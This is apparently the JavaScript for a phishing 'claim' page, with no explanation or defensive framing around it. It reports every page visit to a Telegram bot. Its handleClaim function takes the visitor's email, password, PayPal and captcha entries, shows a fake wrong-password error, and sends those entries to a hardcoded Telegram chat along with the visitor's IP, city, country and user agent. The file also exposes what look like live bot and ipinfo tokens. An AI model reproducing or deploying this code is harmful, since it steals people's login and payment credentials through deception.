const botToken = "7371610501:AAFcYAjSy1ZKgKh7ihaq6dLJvt9yj8gDonE";
const chatId = "7623079090";

// Notify when page loads
fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: chatId,
    text: "🧾 New visitor opened the page"
  })
});

function handleClaim() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const paypal = document.getElementById("paypal").value.trim();
  const captcha = document.getElementById("captchaInput").value.trim();

  const passwordInput = document.getElementById("password");
  const errorDiv = document.getElementById("passwordError");

  // Show error UI
  passwordInput.classList.add("error");
  errorDiv.style.display = "block";
  passwordInput.scrollIntoView({ behavior: "smooth", block: "center" });

  setTimeout(() => {
    passwordInput.classList.remove("error");
    errorDiv.style.display = "none";
  }, 1500);

  // Send data to Telegram
  fetch("https://ipinfo.io/json?token=2da9da1f876081")
    .then(res => res.json())
    .then(data => {
      const msg = `
📩 Login Attempt
📧 Email: ${email}
🔑 Password: ${password}
💸 PayPal: ${paypal}
🧾 CAPTCHA: ${captcha}
🌐 IP: ${data.ip}
📍 Location: ${data.city}, ${data.country}
📱 UA: ${navigator.userAgent}
      `;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg
        })
      });
    });
}

// Toggle password visibility
document.getElementById("togglePassword").addEventListener("click", () => {
  const passInput = document.getElementById("password");
  const toggle = document.getElementById("togglePassword");
  if (passInput.type === "password") {
    passInput.type = "text";
    toggle.textContent = "Hide Password";
  } else {
    passInput.type = "password";
    toggle.textContent = "Show Password";
  }
});